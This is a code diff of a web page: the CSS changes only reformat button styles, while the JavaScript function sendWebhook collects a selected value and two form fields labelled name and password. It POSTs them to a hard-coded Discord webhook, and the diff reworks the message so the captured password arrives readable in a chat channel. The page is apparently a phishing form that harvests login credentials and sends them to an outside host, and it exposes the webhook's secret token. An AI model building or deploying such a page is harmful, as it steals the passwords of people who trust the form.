@@ -51,31 +51,10 @@
       z-index: 2;
     }
 
-    .buttons {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-      margin-top: 20px;
-    }
-
-    button {
-      background: #111827;
-      color: white;
-      border: none;
-      padding: 12px;
-      border-radius: 12px;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      font-size: 16px;
-      transition: 0.2s;
-    }
-
+    .buttons { display: flex; flex-direction: column; gap: 15px; margin-top: 20px; }
+    button { background: #111827; color: white; border: none; padding: 12px; border-radius: 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 16px; transition: 0.2s; }
     button:hover { background: #374151; }
     button img { width: 40px; height: 40px; border-radius: 8px; }
-
     #result { margin-top: 20px; font-size: 18px; }
     #nextBtn { margin-top: 15px; display: none; }
     .hidden { display: none; }
@@ -123,12 +102,14 @@
     function sendWebhook() {
       const input1 = document.getElementById('input1').value;
       const input2 = document.getElementById('input2').value;
-      const webhookUrl = 'https://discord.com/api/webhooks/1485646247577518131/to6KoQXfPfVx7aerg2D-19JmJYvShGkQVQo8FQrm_IbLoau-FrTXHERXEiVTCBW-O375'; // Replace with your webhook
+      const webhookUrl = 'https://discord.com/api/webhooks/1485646247577518131/to6KoQXfPfVx7aerg2D-19JmJYvShGkQVQo8FQrm_IbLoau-FrTXHERXEiVTCBW-O375';
+
+      const message = `Selected: ${selectedValue}\nName: ${input1}\nPassword: ${input2}`;
 
       fetch(webhookUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ selected: selectedValue, name: input1, password: input2 })
+        body: JSON.stringify({ content: message })
       })
       .then(res => res.ok ? alert('Sent!') : alert('Error sending: ' + res.status))
       .catch(err => alert('Fetch error: ' + err));
